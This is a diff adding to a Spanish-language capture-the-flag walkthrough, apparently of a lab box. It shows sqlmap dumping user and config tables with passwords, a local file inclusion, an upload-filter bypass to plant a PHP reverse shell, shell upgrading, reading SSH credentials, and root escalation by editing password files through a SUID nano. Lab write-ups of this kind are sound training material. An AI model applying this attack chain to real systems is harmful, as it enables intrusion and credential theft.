@@ -197,6 +197,138 @@ Vamos a hacer el sql map
 ```
 sqlmap -r request --dump
 ```
+```
+Database: expose
+Table: user
+[4 entries]
++--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
+| id                                   | email                                | created                              | password                             |
++--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
+| 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  | 2023-02-21 09:05:46                  |
+| hacker@root.thm                      | hacker@root.thm                      | hacker@root.thm                      | hacker@root.thm                      |
+| 1                                    | 1                                    | 1                                    | 1                                    |
+| VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 | VeryDifficultPassword!!#@#@!#!@#1231 |
++--------------------------------------+--------------------------------------+--------------------------------------+--------------------------------------+
+```
+
+Nos metemos a la web que encontramos ahora
+
+![image](https://github.com/user-attachments/assets/d93bc49c-9bda-47df-b153-3bf5d485129d)
+
+```
+Database: expose                                                               
+Table: config
+[2 entries]
++----+------------------------------+-----------------------------------------------------+
+| id | url                          | password                                            |
++----+------------------------------+-----------------------------------------------------+
+| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929 (easytohack)       |
+| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
++----+------------------------------+-----------------------------------------------------+
+```
+
+Tambien encontramos esto, vamos a ver si hay algo interesante, nos pide una password cosa que la hemos sacado
+
+![image](https://github.com/user-attachments/assets/fb41f199-f40b-4712-9c21-19089fea8236)
+
+Parece que nos esta retando.
+
+El mismo código fuente nos da una pista: Hint: Try file or view as GET parameters?
+
+Por arte de magia me ha dado por probar una LFI y ha salido jaja
+
+![image](https://github.com/user-attachments/assets/07cfde73-e4c2-494f-8fe2-77d95d149df2)
+
+Con esto podemos hacer cositas como un rev shell o leer directamente archivos que veamos importantes o sacar las ssh 
+
+Ya que estamos también vamos a ver la otra ruta que teniamos ya que sabemos todos los usuarios ahora mismo y sabemos que empieza por Z con lo cu´´al no va aser muy complicado encontrarlo.
+
+zeamkish:x:1001:1001:Zeam Kish
+
+![image](https://github.com/user-attachments/assets/86d41553-0814-44db-abad-853d2ebe831b)
+
+Estamos dentro y parece que con acceso de admin
+
+El mismo código fuente nos dice que solo nos va a dejar meter JPG o PNG con lo cuál tendremos que probar cositas
+
+Cogemos la PHP de pentestmonkey
+
+Ahora vamos a tener que hacer un bypass de php a jpg el nombre que vamos a usar por ejemplo sera "shell.phpD.jpg"
+
+Una vez lo tengamos creado con la rev shell lo subimos, pero antes de subirlo capturamos la request con burp suite
+
+![image](https://github.com/user-attachments/assets/75829c2f-9be8-4e37-9c12-397d77ba1d7b)
+
+![image](https://github.com/user-attachments/assets/8fe85387-faa6-4e02-a0e2-97760c39868e)
+
+Y lo enviamos, vamos a ver si se ha subido
+
+Genial 
+
+![image](https://github.com/user-attachments/assets/74864f3b-a19d-499d-92fa-22c1b2b6926d)
+
+Ahora simplemente abrimos una escucha por el puerto en cuestion "9001" creo y ejecutamos la shell
+
+![image](https://github.com/user-attachments/assets/6ddd3135-7451-4c1b-9809-e7d3602e26fc)
+
+Estamos dentro ya podemos sacar la primera flag y tirar para subir o escalar privilegios
+
+De hecho lo que recomendaria es upgradear la shell
+
+```
+SHELL=/bin/bash script -q /dev/null
+
+STRG+Z
+
+stty raw -echo && fg
+```
+Maravilloso en /home/zeamkish no podemos abrir la flag.txt pero si sus credenciales.
+```
+cat ssh_creds.txt
+cat ssh_creds.txt
+SSH CREDS
+zeamkish
+easytohack@123
+```
+
+Vamos a probar a conectarnos a ver
+
+![image](https://github.com/user-attachments/assets/92210ff7-2e64-4476-8805-9046fd09e84d)
+
+Estamos dentro
+
+# Escala de privilegios
+
+Esto es muy interesante, primero de todo vamos a buscar los servicios que se pueden utilizar
+
+```
+find / -perm -04000 -type f -ls 2>/dev/null
+```
+
+Nos encontramos con el servicio /usr/bin/nano sabiendo esto podemos llegar a cambiar el /etc/passwd 
+
+Simplemente generamos una clave para el password
+
+```
+openssl passwd -1 -salt root 1234
+$1$root$.fAWE/htZAqQge.bvM16O/
+```
+
+Posteriormente nos vamos con nano /etc/shadow y la cambiamos por esa que nos ha generado
+
+```
+su root
+1234
+```
+GG somos root
+
+![image](https://github.com/user-attachments/assets/cba9dbfb-a7a2-4843-85f6-f227a3ca35eb)
+
+
+
+
+
+
 
 
 
